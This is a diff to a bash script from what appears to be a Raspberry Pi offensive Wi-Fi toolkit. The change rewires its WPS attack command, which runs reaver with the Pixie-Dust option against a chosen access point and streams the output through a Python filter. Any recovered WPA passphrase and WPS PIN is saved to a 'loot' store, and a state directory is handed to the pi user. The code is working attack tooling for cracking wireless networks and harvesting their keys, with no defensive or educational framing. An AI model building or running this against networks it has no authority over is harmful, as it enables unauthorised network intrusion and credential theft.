@@ -2175,6 +2175,9 @@ wps_restore() {
 # secret (recovered keys go to the loot store).
 wps_set_state() {
     mkdir -p "$PWN_WPS_DIR" 2>/dev/null || true
+    # pi-owned so the live attack filter (run as pi) can write attack-progress.json
+    # here; root still writes the state/scan files regardless of ownership.
+    chown pi:pi "$PWN_WPS_DIR" 2>/dev/null || true
     chmod 0755 "$PWN_WPS_DIR" 2>/dev/null || true
     printf '%s\n' "$*" > "$PWN_WPS_DIR/state" 2>/dev/null || true
     chmod 0644 "$PWN_WPS_DIR/state" 2>/dev/null || true
@@ -2201,7 +2204,7 @@ cmd_wps_scan() {
 cmd_wps_attack() {
     need_root
     command -v reaver >/dev/null 2>&1 || die "reaver not installed"
-    local bssid="" channel="" pixie yes=no iface out
+    local bssid="" channel="" pixie yes=no iface
     pixie=$(cfg wps.pixie_dust true)
     while [ $# -gt 0 ]; do
         case "$1" in
@@ -2221,22 +2224,18 @@ cmd_wps_attack() {
     local args=(-i "$iface" -b "$bssid" -vv)
     [ -n "$channel" ] && args+=(-c "$channel")
     [ "$pixie" = true ] && args+=(-K 1)
-    log "attacking $bssid on channel ${channel:-auto} (pixie-dust=$pixie); this can take a while..."
-    out=$(reaver "${args[@]}" 2>&1) || true
-    printf '%s\n' "$out"
+    log "attacking $bssid on channel ${channel:-auto} (pixie-dust=$pixie); reaver can take a while — streaming its progress (also on the WPS page)..."
+    # Stream reaver through the pi live filter: it echoes reaver's output here (so
+    # the console and the unit journal stay live), writes the secret-free
+    # attack-progress.json the /wps page overlays, and -- as pi, which owns the
+    # loot store -- records any recovered key. Replaces the old buffered run that
+    # showed nothing until reaver exited.
+    reaver "${args[@]}" 2>&1 \
+        | run_as_pi "$PWN_VENV_PYTHON" -I -m kestrel_pi.wps live \
+            --dir "$PWN_WPS_DIR" --bssid "$bssid" --crack-dir "$PWN_CRACK_DIR" \
+        || true
     wps_restore "$iface"
     wps_set_state idle
-    # Parse + record to the loot store as pi (it owns the store).
-    PWN_OUT="$out" PWN_BSSID="$bssid" run_as_pi "$PWN_VENV_PYTHON" -I -c '
-import os
-from kestrel_pi import wps
-g = wps.parse_reaver_output(os.environ.get("PWN_OUT", ""))
-if g.get("psk") is not None:
-    wps.record_to_loot(os.environ["PWN_BSSID"], g.get("essid", ""), g["psk"], g.get("pin", ""))
-    print("recovered PSK: %r (WPS pin %s) -- saved to loot" % (g["psk"], g.get("pin", "?")))
-else:
-    print("no key recovered (the AP may be WPS-locked or not vulnerable)")
-' || true
 }
 
 cmd_wps_list() {
